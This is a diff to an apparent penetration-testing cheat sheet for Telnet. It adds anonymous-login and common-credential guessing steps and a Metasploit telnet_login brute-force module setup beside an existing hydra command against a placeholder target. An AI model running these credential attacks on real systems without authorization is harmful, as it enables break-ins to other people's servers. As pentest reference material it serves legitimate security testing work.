@@ -73,6 +73,30 @@ msf > exploit
 
 ## Attacks 
 
+#### Passwordless Authentication
+
+Telnet allows users to connect to a server without needing a specific identity by utilizing a passwordless login feature. This method is commonly employed for accessing or downloading public files.
+
+To connect without a password, you would use the following command:
+
+```bash
+telnet $TARGET_IP
+
+#send username
+#but not provide any password
+```
+#### Common Credentials
+
+If anonymous login is disabled on the Telnet server, trying common usernames and passwords like admin, administrator , root , user, or test can be a good initial step. This approach is less aggressive than attempting to guess passwords through brute force and is recommended to try first when accessing a server.
+
+```bash
+telnet $TARGET_IP
+
+#provide a common username
+#provide a common password
+```
+
+
 #### Brute Force
 
 ::: tabs
@@ -91,11 +115,23 @@ hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S $TARGET
 hydra -l root -P $PATH_TO/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt $TARGET_IP telnet
 ```
 
-::: 
+=== Metasploit
 
+```msfconsole
+use auxiliary/scanner/telnet/telnet_login
+msf auxiliary(telnet_login) > set rhosts  $TARGET_IP
+msf auxiliary(telnet_login) > set user_file /path/to/user.txt
+msf auxiliary(telnet_login) > set pass_file /path/to/pass.txt
+msf auxiliary(telnet_login) > set stop_on_success true
+msf auxiliary(telnet_login) > exploit
+```
+::: 
+ ----
+ 
 
 ### Resources 
-https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet
-https://secybr.com/posts/telnet-pentesting-best-practices/
-https://github.com/InfoSecWarrior/Offensive-Pentesting-Host/blob/main/Telnet/README.md
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet  
+https://secybr.com/posts/telnet-pentesting-best-practices/  
+https://github.com/InfoSecWarrior/Offensive-Pentesting-Host/blob/main/Telnet/README.md  
+https://hackviser.com/tactics/pentesting/services/telnet
 
